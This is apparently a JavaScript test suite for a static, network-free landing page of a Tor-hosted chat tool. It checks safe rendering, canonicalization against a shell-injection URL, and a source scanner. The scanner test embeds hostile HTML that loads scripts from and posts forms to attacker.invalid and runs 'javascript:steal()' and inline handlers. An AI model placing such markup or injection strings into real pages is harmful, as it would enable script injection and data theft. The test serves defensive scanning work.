import assert from "node:assert/strict";
import { existsSync } from "node:fs";
import { readFile } from "node:fs/promises";
import test from "node:test";
import { fileURLToPath, pathToFileURL } from "node:url";
import { dirname, join } from "node:path";

const appRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
const appPath = join(appRoot, "app.js");
const htmlPath = join(appRoot, "index.html");
const cssPath = join(appRoot, "styles.css");

async function shellModule() {
  assert.equal(existsSync(appPath), true, "the inert shell module must exist");
  return import(pathToFileURL(appPath));
}

test("recognizes only a local nprofile-shaped bootstrap fragment", async () => {
  const { recognizeBootstrap } = await shellModule();
  const nprofile = "nprofile1qqspqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqzww9";

  assert.deepEqual(recognizeBootstrap(`#${nprofile}`), {
    detected: true,
    nprofile,
  });
  assert.deepEqual(recognizeBootstrap("#note1not-a-profile"), {
    detected: false,
    nprofile: null,
  });
  assert.deepEqual(recognizeBootstrap(""), {
    detected: false,
    nprofile: null,
  });
});

test("derives the future relay path from the page origin", async () => {
  const { describeLocation } = await shellModule();
  const location = new URL(
    "http://abcdefghijklmnopqrstuvwxyz234567abcdefghijklmnopqrstuvwxyz2345.onion/#nprofile1qqqq",
  );

  assert.equal(
    describeLocation(location).relayUrl,
    "ws://abcdefghijklmnopqrstuvwxyz234567abcdefghijklmnopqrstuvwxyz2345.onion/relay",
  );
});

test("renders the exact future CLI command through textContent only", async () => {
  const { renderShell } = await shellModule();
  const bootstrapUrl =
    "http://abcdefghijklmnopqrstuvwxyz234567abcdefghijklmnopqrstuvwxyz2345.onion/#nprofile1qqspqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqzww9";
  const elements = new Map();
  const writes = [];
  for (const name of ["relay-url", "bootstrap-state", "cli-command"]) {
    elements.set(name, {
      set textContent(value) {
        writes.push({ name, sink: "textContent", value });
      },
      set innerHTML(_value) {
        assert.fail("bootstrap data must never enter an HTML sink");
      },
    });
  }
  const root = {
    querySelector(selector) {
      return elements.get(selector.match(/^\[data-shell="([^"]+)"\]$/)?.[1]);
    },
  };

  renderShell(new URL(bootstrapUrl), root);

  assert.deepEqual(writes.find(({ name }) => name === "cli-command"), {
    name: "cli-command",
    sink: "textContent",
    value: `npx deaddrop chat '${bootstrapUrl}'`,
  });
  assert.equal(writes.every(({ sink }) => sink === "textContent"), true);
});

test("canonicalizes an adversarial bootstrap URL before placing it in the CLI command", async () => {
  const { describeLocation } = await shellModule();
  const nprofile = "nprofile1qqspqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqzww9";
  const location = new URL(
    `http://user:secret@abcdefghijklmnopqrstuvwxyz234567abcdefghijklmnopqrstuvwxyz2345.onion/it%27s/a/trap?next='%20%26%20run#${nprofile}`,
  );

  assert.equal(
    describeLocation(location).command,
    `npx deaddrop chat 'http://abcdefghijklmnopqrstuvwxyz234567abcdefghijklmnopqrstuvwxyz2345.onion/#${nprofile}'`,
  );
});

test("describes detection as shape recognition rather than validation", async () => {
  const { renderShell } = await shellModule();
  const writes = new Map();
  const root = {
    querySelector(selector) {
      return {
        set textContent(value) {
          writes.set(selector, value);
        },
      };
    },
  };
  renderShell(
    new URL(
      "http://abcdefghijklmnopqrstuvwxyz234567abcdefghijklmnopqrstuvwxyz2345.onion/#nprofile1qqspqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqzww9",
    ),
    root,
  );

  assert.match(writes.get('[data-shell="bootstrap-state"]'), /nprofile-shaped fragment/);
  assert.doesNotMatch(writes.get('[data-shell="bootstrap-state"]'), /valid|verified/i);
});

test("contains only local inert assets and no network, log, cookie, or storage sink", async () => {
  for (const path of [appPath, htmlPath, cssPath]) {
    assert.equal(existsSync(path), true, `${path} must exist`);
  }
  const [app, html, css, manifest] = await Promise.all([
    readFile(appPath, "utf8"),
    readFile(htmlPath, "utf8"),
    readFile(cssPath, "utf8"),
    readFile(join(appRoot, "package.json"), "utf8"),
  ]);
  const source = `${app}\n${html}\n${css}`;

  for (const forbidden of [
    /https?:\/\//i,
    /\bfetch\s*\(/,
    /XMLHttpRequest/,
    /\bWebSocket\b/,
    /EventSource/,
    /serviceWorker/,
    /localStorage|sessionStorage|indexedDB/,
    /document\.cookie/,
    /\bconsole\s*\./,
    /innerHTML|outerHTML|insertAdjacentHTML/,
    /sendBeacon/,
    /RTCPeerConnection/,
    /\bstun\b|\bturn\b/i,
    /\b(?:gtag|plausible|mixpanel|segment|analytics)\s*\(/i,
    /@font-face|fonts?\.(?:googleapis|gstatic)/i,
  ]) {
    assert.doesNotMatch(source, forbidden);
  }
  assert.doesNotMatch(html, /<style\b/i);
  assert.deepEqual(inlineCodeAttributes(html), []);
  assert.doesNotMatch(html, /<script(?![^>]*\bsrc=)[^>]*>/i);
  assert.doesNotMatch(css, /@import/i);
  assert.doesNotMatch(css, /url\s*\(/i);
  assert.equal(hasModuleImport(app), false);
  assert.doesNotMatch(app, /\b(?:Worker|SharedWorker)\s*\(|import\.meta/);
  const runtimeReferences = runtimeAssetReferences(html);
  assert.deepEqual(runtimeReferences, ["./styles.css", "#main", "./app.js"]);
  assert.equal(
    runtimeReferences.every(isAllowedRuntimeReference),
    true,
  );
  assert.deepEqual(JSON.parse(manifest).dependencies, undefined);
  assert.deepEqual(JSON.parse(manifest).devDependencies, undefined);
});

test("source-policy scanners detect alternate quoting and executable attributes", () => {
  const hostileMarkup = `
    <script src='//attacker.invalid/one.js'></script>
    <img src=custom:payload srcset="//attacker.invalid/a 1x, //attacker.invalid/b 2x">
    <video poster=https://attacker.invalid/poster></video>
    <object data='data:text/html,hostile'></object>
    <form action=//attacker.invalid/post onsubmit='steal()'>
      <button formaction='javascript:steal()' style='display:block' onclick=steal()>go</button>
    </form>
  `;

  assert.deepEqual(runtimeAssetReferences(hostileMarkup), [
    "//attacker.invalid/one.js",
    "custom:payload",
    "//attacker.invalid/a 1x, //attacker.invalid/b 2x",
    "https://attacker.invalid/poster",
    "data:text/html,hostile",
    "//attacker.invalid/post",
    "javascript:steal()",
  ]);
  assert.equal(
    runtimeAssetReferences(hostileMarkup).every(isAllowedRuntimeReference),
    false,
  );
  assert.deepEqual(inlineCodeAttributes(hostileMarkup), [
    "onsubmit",
    "style",
    "onclick",
  ]);
  assert.equal(hasModuleImport("import './extra.js';"), true);
  assert.equal(hasModuleImport('import("./extra.js")'), true);
  assert.equal(hasModuleImport('import value from "./extra.js";'), true);
});

test("quiet text meets WCAG AA contrast against the paper background", async () => {
  assert.equal(existsSync(cssPath), true, "the shell stylesheet must exist");
  const css = await readFile(cssPath, "utf8");
  const paper = css.match(/--paper:\s*(#[0-9a-f]{6})/i)?.[1];
  const quiet = css.match(/--quiet:\s*(#[0-9a-f]{6})/i)?.[1];
  assert.ok(paper, "paper token must be a six-digit hex color");
  assert.ok(quiet, "quiet token must be a six-digit hex color");

  assert.ok(
    contrastRatio(paper, quiet) >= 4.5,
    `quiet text contrast was ${contrastRatio(paper, quiet).toFixed(2)}:1`,
  );
});

test("exposes an accessible responsive status document without fake controls", async () => {
  assert.equal(existsSync(htmlPath), true, "the landing document must exist");
  assert.equal(existsSync(cssPath), true, "the shell stylesheet must exist");
  const [html, css] = await Promise.all([
    readFile(htmlPath, "utf8"),
    readFile(cssPath, "utf8"),
  ]);

  assert.match(html, /<main\b/);
  assert.match(html, /<h1\b/);
  assert.match(html, /role="status"/);
  assert.match(html, /aria-live="polite"/);
  assert.doesNotMatch(html, /<(?:button|input|textarea|form)\b/i);
  assert.match(css, /@media\s*\([^)]*max-width/i);
  assert.match(css, /prefers-reduced-motion:\s*reduce/i);
  assert.match(css, /:focus-visible/);
});

function contrastRatio(left, right) {
  const light = Math.max(relativeLuminance(left), relativeLuminance(right));
  const dark = Math.min(relativeLuminance(left), relativeLuminance(right));
  return (light + 0.05) / (dark + 0.05);
}

function relativeLuminance(hex) {
  const channels = hex
    .slice(1)
    .match(/.{2}/g)
    .map((channel) => Number.parseInt(channel, 16) / 255)
    .map((channel) =>
      channel <= 0.04045
        ? channel / 12.92
        : ((channel + 0.055) / 1.055) ** 2.4,
    );
  return 0.2126 * channels[0] + 0.7152 * channels[1] + 0.0722 * channels[2];
}

function runtimeAssetReferences(markup) {
  const attribute =
    /\b(?:src|href|srcset|poster|data|action|formaction)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'=<>`]+))/gi;
  return [...markup.matchAll(attribute)].map(
    (match) => match[1] ?? match[2] ?? match[3],
  );
}

function isAllowedRuntimeReference(reference) {
  return ["#main", "./styles.css", "./app.js"].includes(reference);
}

function inlineCodeAttributes(markup) {
  return [...markup.matchAll(/\s(style|on[a-z][a-z0-9_-]*)\s*=/gi)].map(
    (match) => match[1].toLowerCase(),
  );
}

function hasModuleImport(source) {
  return /\bimport\s*(?:\(|["']|(?:[\w*{][^;]*?\bfrom\s*["']))/.test(source);
}
